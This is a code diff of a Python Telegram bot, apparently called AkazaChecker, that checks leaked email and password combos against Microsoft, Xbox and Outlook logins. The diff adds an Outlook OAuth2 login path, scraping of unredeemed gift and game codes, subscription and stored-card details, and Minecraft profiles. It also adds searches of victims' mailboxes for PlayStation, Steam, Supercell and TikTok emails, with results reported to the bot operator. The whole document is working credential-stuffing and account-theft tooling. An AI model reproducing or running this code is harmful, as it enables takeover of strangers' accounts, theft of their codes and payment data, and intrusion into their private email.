@@ -1,15 +1,11 @@
-import re, json, uuid, sqlite3, logging, asyncio
-import time, os, random, threading, requests, urllib3
+import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3
 from datetime import datetime, timedelta
 from pathlib import Path
 from urllib.parse import quote, unquote, urlparse, parse_qs
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
-from telegram import (Update, InlineKeyboardButton,
-                      InlineKeyboardMarkup)
-from telegram.ext import (Application, CommandHandler,
-    MessageHandler, CallbackQueryHandler,
-    ContextTypes, filters)
+from telegram import (Update, InlineKeyboardButton, InlineKeyboardMarkup)
+from telegram.ext import (Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters)
 
 # ============================================================================
 # SECTION 2 — IMPORTS & SETUP
@@ -44,6 +40,24 @@ PROXIES_LIST = []
 # Global thread pool
 bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
 db_lock = threading.Lock()
+
+# Code patterns for extracting codes (flux.py)
+CODE_PATTERNS = [
+    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 5-part
+    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',              # 4-part
+    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',                          # 3-part
+]
+
+# Exclusion list for codes (flux.py)
+EXCLUDE_WORDS = {
+    'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS',
+    'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER',
+    'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER',
+    'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB',
+    'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND',
+    'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION',
+    'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'
+}
 
 # ============================================================================
 # SECTION 4 — AkazaDatabase CLASS
@@ -333,14 +347,15 @@ class AkazaChecker:
 
     def get_redemption_codes(self):
         codes = []
-        exclude_words = {'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS', 'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER', 'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER', 'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB', 'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND', 'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION', 'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'}
         try:
             r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10, verify=False))
             soup = BeautifulSoup(r.text, 'html.parser')
             vt_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
             vt = vt_input.get('value', '') if vt_input else ''
-            rows = soup.find('table', class_='table').find_all('tr') if soup.find('table', class_='table') else []
-            pats = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
+            table = soup.find('table', class_='table')
+            rows = []
+            if table and table.tbody: rows = table.tbody.find_all('tr')
+            elif table: rows = table.find_all('tr')
             for row in rows:
                 cells = row.find_all(['td', 'th'])
                 if len(cells) < 3: continue
@@ -349,52 +364,63 @@ class AkazaChecker:
                 if btn:
                     act = btn.get('data-actionurl', '').replace('&amp;', '&')
                     if act.startswith('/'): act = 'https://rewards.bing.com' + act
-                    cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False).text
-                    code_found = False
-                    # a. resendSuccess
+                    try: cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False).text
+                    except: continue
+                    code_found = False; cat = self.detect_category(title, cr)
                     csoup = BeautifulSoup(cr, 'html.parser')
+                    # a. resendSuccess tango keys
                     rs = csoup.find('div', class_='resendSuccess')
                     if rs:
-                        keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
-                        vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
-                        for k, v in zip(keys, vals):
+                        for k, v in zip(rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I)), rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))):
                             if any(x in k.get_text(strip=True).upper() for x in ['CODE', 'PIN']):
                                 c = v.get_text(strip=True)
-                                if '*' not in c:
-                                    codes.append({'code': c, 'category': self.detect_category(title, cr), 'redemption_url': '', 'date': date})
-                                    code_found = True; break
+                                if '*' not in c: codes.append({'code': c, 'category': cat, 'redemption_url': '', 'date': date}); code_found = True; break
                     if code_found: continue
-                    # b-g. Patterns and others
-                    ru = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', cr)
-                    cat = self.detect_category(title, cr)
-                    for p in pats:
+                    # b. Redemption URL patterns
+                    ru = ''
+                    for rp in [r"<a[^>]*href=['\"]([^'\"]*)['|\"][^>]*>Redemption URL</a>", r'href="([^"]*redeem[^"]*)"', r'href="([^"]*claim[^"]*)"']:
+                        rm = re.search(rp, cr, re.IGNORECASE)
+                        if rm: ru = rm.group(1).strip(); break
+                    # c. Pattern matching (5/4/3-part)
+                    for p in CODE_PATTERNS:
                         m = re.search(p, cr)
-                        if m and '*' not in m.group() and m.group().upper() not in exclude_words:
-                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': ru.group(1) if ru else '', 'date': date})
-                            code_found = True; break
+                        if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
+                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True; break
+                    # d. PIN/CODE label
                     if not code_found:
                         m = re.search(r'(?:PIN|CODE)\s*:\s*([A-Z0-9]{4}-[A-Z0-9\-]+)', cr, re.I)
-                        if m: codes.append({'code': m.group(1), 'category': cat, 'redemption_url': '', 'date': date})
+                        if m and '*' not in m.group(1): codes.append({'code': m.group(1), 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True
+                    # e. Clipboard button
+                    if not code_found:
+                        for cb in csoup.find_all('button', attrs={'data-clipboard-text': True}):
+                            val = cb['data-clipboard-text'].strip()
+                            if val and len(val) >= 12 and '*' not in val: codes.append({'code': val, 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True; break
+                    # f. pre/code tags
+                    if not code_found:
+                        for tag in csoup.find_all(['pre', 'code']):
+                            for p in CODE_PATTERNS:
+                                m = re.match(p, tag.get_text(strip=True))
+                                if m and '*' not in m.group(): codes.append({'code': m.group(), 'category': cat, 'redemption_url': ru, 'date': date}); code_found = True; break
+                            if code_found: break
                 else:
                     code_text = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
                     cat = self.detect_category(title, code_text)
-                    for p in pats:
+                    for p in CODE_PATTERNS:
                         m = re.search(p, code_text)
-                        if m and '*' not in m.group() and m.group().upper() not in exclude_words:
-                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': '', 'date': date})
-                            break
+                        if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
+                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': '', 'date': date}); break
         except: pass
         return codes
 
     def detect_category(self, title, row_text=''):
         t = (title + row_text).lower()
         if 'overwatch' in t: return 'Overwatch'
-        if 'sea of thieves' in t: return 'Sea of Thieves'
+        if 'sea of thieves' in t or 'ancient coins' in t: return 'Sea of Thieves'
         if 'roblox' in t or 'robux' in t: return 'Roblox'
-        if 'league' in t or 'riot' in t: return 'League of Legends'
+        if 'league' in t or 'riot' in t or ' lol ' in t: return 'League of Legends'
         if 'game pass' in t or 'gamepass' in t: return 'Game Pass'
-        if 'minecraft' in t: return 'Minecraft'
-        if any(x in t for x in ['gift card', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'spotify']): return 'Gift Card'
+        if 'minecraft' in t or 'minecoins' in t: return 'Minecraft'
+        if any(x in t for x in ['gift card', 'giftcard', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'subway', 'doordash', 'uber', 'target', 'spotify']): return 'Gift Card'
         return 'Unknown'
 
     def get_microsoft_subs(self):
@@ -414,8 +440,22 @@ class AkazaChecker:
             keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS', 'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD', 'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL', 'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
             for k, disp in keys.items():
                 if k in rt:
+                    si = {'name': disp, 'is_expired': False}
                     rd_m = re.search(rf'"{k}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt, re.S)
-                    subs.append({'name': disp, 'is_expired': False, 'renewal_date': rd_m.group(1) if rd_m else 'N/A'})
+                    if rd_m:
+                        si['renewal_date'] = rd_m.group(1)
+                        try:
+                            rem = (datetime.fromisoformat(rd_m.group(1)) - datetime.now()).days
+                            si['days_remaining'] = rem
+                            if rem < 0: si['is_expired'] = True
+                        except: pass
+                    ar_m = re.search(r'"autoRenew"\s*:\s*(true|false)', rt)
+                    if ar_m: si['auto_renew'] = 'YES' if ar_m.group(1)=='true' else 'NO'
+                    amt_m = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', rt)
+                    if amt_m: si['amount'] = amt_m.group(1)
+                    cur_m = re.search(r'"currency"\s*:\s*"([^"]+)"', rt)
+                    if cur_m: si['currency'] = cur_m.group(1)
+                    subs.append(si)
             return {"status": "PREMIUM" if subs else "FREE", "subs": subs, "balance": "$"+bal_m.group(1) if bal_m else "", "card": card_m.group(1) if card_m else ""}
         except: return {"status":"FREE","subs":[],"balance":"","card":""}
 
@@ -426,7 +466,7 @@ class AkazaChecker:
             return r.get('displayName', 'N/A'), r.get('country') or r.get('location', {}).get('country') or 'N/A'
         except: return 'N/A', 'N/A'
 
-    def get_minecraft(self, tk):
+    def get_minecraft_enhanced(self, tk):
         try:
             r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com","RpsTicket":f"d={tk}"},"RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"}, timeout=10, verify=False).json()
             xbl_tk, uhs = r1['Token'], r1['DisplayClaims']['xui'][0]['uhs']
@@ -435,16 +475,78 @@ class AkazaChecker:
             r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken":f"XBL3.0 x={uhs};{xsts_tk}"}, timeout=10, verify=False).json()
             mc_tk = r3['access_token']
             r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization":f"Bearer {mc_tk}"}, timeout=10, verify=False)
-            if r4.status_code == 200: d = r4.json(); return {"owned": True, "username": d['name']}
+            if r4.status_code == 200:
+                d = r4.json()
+                return {"owned": True, "username": d['name'], "uuid": d.get('id', ''), "capes": [c.get('alias', '') for c in d.get('capes', [])]}
         except: pass
         return {"owned": False}
 
-    def scan_inbox(self, tk, cid, uk):
-        res = {}
+    def check_psn(self, tk, cid):
+        try:
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation Order Number"}, "Size": 25}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=12, verify=False).json()
+            rset = r['EntitySets'][0]['ResultSets'][0]
+            total = rset.get('Total', 0)
+            purchases = []
+            if total > 0:
+                for hit in rset.get('Results', []):
+                    text = (hit.get('Subject', '') + hit.get('Preview', '')).lower()
+                    m = re.search(r'purchasing\s+([^\.]+)', text)
+                    if m: purchases.append(m.group(1).strip())
+            return {"count": total, "items": list(set(purchases))[:5]}
+        except: return {"count": 0, "items": []}
+
+    def check_steam(self, tk, cid):
+        try:
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 10}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10, verify=False).json()
+            total = r['EntitySets'][0]['ResultSets'][0].get('Total', 0)
+            return {"count": total}
+        except: return {"count": 0}
+
+    def check_supercell(self, tk, cid):
+        try:
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 15}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10, verify=False).json()
+            rset = r['EntitySets'][0]['ResultSets'][0]
+            games = []
+            if rset.get('Total', 0) > 0:
+                for hit in rset.get('Results', []):
+                    pre = hit.get('Preview', '').lower()
+                    for g in ['Clash Royale', 'Clash of Clans', 'Brawl Stars', 'Hay Day']:
+                        if g.lower() in pre and g not in games: games.append(g)
+            return games
+        except: return []
+
+    def check_tiktok(self, tk, cid):
+        try:
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "account.tiktok"}, "Size": 5}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10, verify=False).json()
+            if r['EntitySets'][0]['ResultSets'][0].get('Total', 0) > 0:
+                pre = r['EntitySets'][0]['ResultSets'][0]['Results'][0].get('Preview', '')
+                m = re.search(r'(?:Hi|Hello|Salut|Xin chào)\s+([^,]+)', pre)
+                if m: return m.group(1).strip()
+        except: pass
+        return None
+
+    def scan_inbox_enhanced(self, tk, cid, uk):
+        res = {"total": 0, "hits": {}}
+        try:
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+            # Get total count via StartupData simplified
+            r_start = self.session.post(f"https://outlook.live.com/owa/me/startupdata.ashx?app=Mini", headers={'Authorization':f'Bearer {tk}', 'x-owa-sessionid':str(uuid.uuid4())}, timeout=10, verify=False)
+            m_count = re.search(r'"DisplayName":"Inbox","TotalCount":(\d+)', r_start.text)
+            if m_count: res['total'] = int(m_count.group(1))
+        except: pass
+
         combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
         h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-        for i in range(0, len(combined), 8):
-            batch = combined[i:i+8]
+        for i in range(0, len(combined), 10):
+            batch = combined[i:i+10]
             q = " OR ".join([f'"{k}"' for k in batch])
             p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 25}]}
             try:
@@ -456,48 +558,129 @@ class AkazaChecker:
                         for k in batch:
                             if k.lower() in text:
                                 name = SERVICE_KEYWORDS.get(k, k)
-                                res[name] = res.get(name, 0) + 1
+                                res['hits'][name] = res['hits'].get(name, 0) + 1
             except: pass
         return res
+
+    def _outlook_login(self, email, password):
+        """Secondary login via Outlook OAuth2 (hit.py flow) — returns (outlook_token, cid) or (None, None)"""
+        try:
+            r1 = self.session.get(
+                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
+                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)"},
+                timeout=10, verify=False)
+            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
+                return None, None
+            r2 = self.session.get(
+                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
+                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+                timeout=15, verify=False)
+            um = re.search(r'urlPost\":\"([^"]+)\"', r2.text)
+            pm = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^"]+)\"', r2.text)
+            if not um or not pm: return None, None
+            post_url = um.group(1).replace("\\/", "/")
+            ppft = pm.group(1)
+            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
+            r3 = self.session.post(post_url, data=login_data,
+                                   headers={"Content-Type": "application/x-www-form-urlencoded",
+                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+                                   allow_redirects=False, timeout=15, verify=False)
+            loc = r3.headers.get("Location", "")
+            cm = re.search(r'code=([^&]+)', loc)
+            if not cm: return None, None
+            cid = self.session.cookies.get("MSPCID", "").upper()
+            td = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={cm.group(1)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+                                   data=td, headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                   timeout=15, verify=False)
+            if "access_token" not in r4.text: return None, None
+            return r4.json()["access_token"], cid
+        except: return None, None
 
     async def check(self, email, password, uk=[], fast=False):
         loop = asyncio.get_running_loop()
         try:
+            # --- Primary: Xbox RPS login (flux.py / original) ---
             up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
-            if not up:
-                logger.error(f"SFTAG failed for {email}")
-                return {'status': 'error', 'email': email, 'password': password}
-            status, token = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
-            if status != 'TOKEN':
-                return {'status': status.lower(), 'email': email, 'password': password}
+            if not up: return {'status': 'error', 'email': email, 'password': password}
+            status, xbox_token = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
+            if status == '2FA': return {'status': '2fa', 'email': email, 'password': password}
+            if status in ('BAD', 'bad'): return {'status': 'bad', 'email': email, 'password': password}
 
-            cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), 'N/A')
+            xbox_ok = (status == 'TOKEN' and xbox_token)
+            cid_xbox = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), 'N/A')
 
-            if fast:
+            # --- Secondary: Outlook OAuth2 login (hit.py) — separate session ---
+            outlook_checker = AkazaChecker(None)
+            if self.session.proxies: outlook_checker.session.proxies = self.session.proxies
+            outlook_token, cid_outlook = await loop.run_in_executor(
+                bot_executor, outlook_checker._outlook_login, email, password)
+
+            # If neither login succeeded, mark bad
+            if not xbox_ok and not outlook_token:
+                return {'status': 'bad', 'email': email, 'password': password}
+
+            tok_out = outlook_token  # for inbox/PSN/Steam/Supercell/TikTok
+            cid_out = cid_outlook or cid_xbox
+
+            if fast and xbox_ok:
                 pts = await loop.run_in_executor(bot_executor, self.get_rewards_points)
                 codes = await loop.run_in_executor(bot_executor, self.get_redemption_codes)
-                return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {}, 'name': 'N/A', 'country': 'N/A', 'mc': {'owned': False}, 'inbox': {}}
+                return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes,
+                        'subs': {}, 'name': 'N/A', 'country': 'N/A', 'mc': {'owned': False},
+                        'inbox': {}, 'psn': {'count':0,'items':[]}, 'steam': {'count':0},
+                        'supercell': [], 'tiktok': None}
 
-            # Run captures in parallel
-            tasks = [
-                loop.run_in_executor(bot_executor, self.get_rewards_points),
-                loop.run_in_executor(bot_executor, self.get_redemption_codes),
-                loop.run_in_executor(bot_executor, self.get_microsoft_subs),
-                loop.run_in_executor(bot_executor, self.get_profile, token, cid),
-                loop.run_in_executor(bot_executor, self.get_minecraft, token),
-                loop.run_in_executor(bot_executor, self.scan_inbox, token, cid, uk)
-            ]
+            # --- Run ALL captures in parallel ---
+            def _safe(fn, *args):
+                try: return fn(*args)
+                except: return None
+
+            tasks = []
+            # Xbox-session captures
+            if xbox_ok:
+                tasks += [
+                    loop.run_in_executor(bot_executor, self.get_rewards_points),
+                    loop.run_in_executor(bot_executor, self.get_redemption_codes),
+                    loop.run_in_executor(bot_executor, self.get_microsoft_subs),
+                    loop.run_in_executor(bot_executor, self.get_minecraft_enhanced, xbox_token),
+                ]
+            else:
+                tasks += [asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0)]
+
+            # Outlook-session captures
+            if tok_out and cid_out:
+                tasks += [
+                    loop.run_in_executor(bot_executor, self.get_profile, tok_out, cid_out),
+                    loop.run_in_executor(bot_executor, outlook_checker.scan_inbox_enhanced, tok_out, cid_out, uk),
+                    loop.run_in_executor(bot_executor, outlook_checker.check_psn, tok_out, cid_out),
+                    loop.run_in_executor(bot_executor, outlook_checker.check_steam, tok_out, cid_out),
+                    loop.run_in_executor(bot_executor, outlook_checker.check_supercell, tok_out, cid_out),
+                    loop.run_in_executor(bot_executor, outlook_checker.check_tiktok, tok_out, cid_out),
+                ]
+            else:
+                tasks += [asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0),
+                          asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0)]
+
             results = await asyncio.gather(*tasks, return_exceptions=True)
+            def r(i, default): return results[i] if not isinstance(results[i], Exception) and results[i] is not None else default
 
-            # Safe unpacking
-            pts = results[0] if not isinstance(results[0], Exception) else 0
-            codes = results[1] if not isinstance(results[1], Exception) else []
-            subs = results[2] if not isinstance(results[2], Exception) else {"status":"FREE","subs":[],"balance":"","card":""}
-            name, country = results[3] if not isinstance(results[3], Exception) else ('N/A', 'N/A')
-            mc = results[4] if not isinstance(results[4], Exception) else {"owned": False}
-            inbox = results[5] if not isinstance(results[5], Exception) else {}
+            pts    = r(0, 0)
+            codes  = r(1, [])
+            subs   = r(2, {"status":"FREE","subs":[],"balance":"","card":""})
+            mc     = r(3, {"owned": False})
+            name_country = r(4, ('N/A','N/A'))
+            name, country = name_country if isinstance(name_country, tuple) else ('N/A','N/A')
+            inbox  = r(5, {"total":0,"hits":{}})
+            psn    = r(6, {"count":0,"items":[]})
+            steam  = r(7, {"count":0})
+            supercell = r(8, [])
+            tiktok = r(9, None)
 
-            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country, 'mc': mc, 'inbox': inbox}
+            return {'status': 'hit', 'email': email, 'password': password,
+                    'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country,
+                    'mc': mc, 'inbox': inbox, 'psn': psn, 'steam': steam,
+                    'supercell': supercell, 'tiktok': tiktok}
         except Exception as e:
             logger.exception(f"Check error for {email}: {e}")
             return {'status': 'error', 'email': email, 'password': password}
@@ -596,6 +779,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                        f"👤 {data.get('name','N/A')} | 🌍 {country}\n"
                        f"⭐ Points: `{pts}`\n")
 
+                # Redemption codes (with categories and URLs)
                 codes = data.get('codes', [])
                 if codes:
                     cat_map = {}
@@ -604,21 +788,60 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                         c_strs = [f"`{co['code']}`" + (f" [Redeem]({co['redemption_url']})" if co.get('redemption_url') else "") for co in clist]
                         msg += f"🎮 {cat}: {', '.join(c_strs)}\n"
 
+                # Microsoft Subscriptions — with days remaining and auto renew
                 subs_data = data.get('subs', {})
                 subs = subs_data.get('subs', [])
-                active = [su['name'] for su in subs if not su.get('is_expired')]
-                if active: msg += f"🎮 MS Subs: {', '.join(active)}\n"
+                active = [su for su in subs if not su.get('is_expired')]
+                if active:
+                    sub_lines = []
+                    for su in active:
+                        s_str = su['name']
+                        if 'days_remaining' in su: s_str += f" ({su['days_remaining']}d"
+                        if 'auto_renew' in su: s_str += f", AR:{su['auto_renew']}"
+                        if 'days_remaining' in su: s_str += ")"
+                        sub_lines.append(s_str)
+                    msg += f"🎮 MS Subs: {', '.join(sub_lines)}\n"
                 if subs_data.get('balance'): msg += f"💳 Balance: {subs_data['balance']}\n"
+                if subs_data.get('card'): msg += f"💳 Card: {subs_data['card']}\n"
 
-                if data.get('mc', {}).get('owned'):
-                    msg += f"⛏️ Minecraft: `{data['mc']['username']}`\n"
+                # Minecraft with capes
+                mc = data.get('mc', {})
+                if mc.get('owned'):
+                    mc_str = f"⛏️ Minecraft: `{mc.get('username','?')}`"
+                    if mc.get('uuid'): mc_str += f" | UUID: `{mc['uuid'][:8]}...`"
+                    if mc.get('capes'): mc_str += f" | Capes: {', '.join(mc['capes'])}"
+                    msg += mc_str + "\n"
 
+                # PSN
+                psn = data.get('psn', {})
+                if psn.get('count', 0) > 0:
+                    msg += f"🎮 PSN: {psn['count']} orders"
+                    if psn.get('items'): msg += f" — {', '.join(psn['items'][:3])}"
+                    msg += "\n"
+
+                # Steam
+                steam = data.get('steam', {})
+                if steam.get('count', 0) > 0:
+                    msg += f"🎮 Steam: {steam['count']} purchase emails\n"
+
+                # Supercell
+                if data.get('supercell'):
+                    msg += f"📱 Supercell: {', '.join(data['supercell'])}\n"
+
+                # TikTok
+                if data.get('tiktok'):
+                    msg += f"🎵 TikTok: `{data['tiktok']}`\n"
+
+                # Inbox (with total and top keywords)
                 inbox = data.get('inbox', {})
-                if inbox:
-                    top5 = list(inbox.items())[:5]
+                inbox_total = inbox.get('total', 0) if isinstance(inbox, dict) else 0
+                inbox_hits  = inbox.get('hits', inbox) if isinstance(inbox, dict) else {}
+                if inbox_total: msg += f"📬 Inbox: {inbox_total} total\n"
+                if inbox_hits:
+                    top5 = list(inbox_hits.items())[:5]
                     sv = ', '.join(f"{k}({v})" for k, v in top5)
-                    msg += f"📬 Inbox: {sv}\n"
-                    if len(inbox) > 5: msg += f"  ...+{len(inbox)-5} more\n"
+                    msg += f"� Keywords: {sv}\n"
+                    if len(inbox_hits) > 5: msg += f"  ...+{len(inbox_hits)-5} more\n"
 
                 try: await c.bot.send_message(uid, msg, parse_mode='Markdown', disable_web_page_preview=True)
                 except: pass
@@ -626,8 +849,9 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
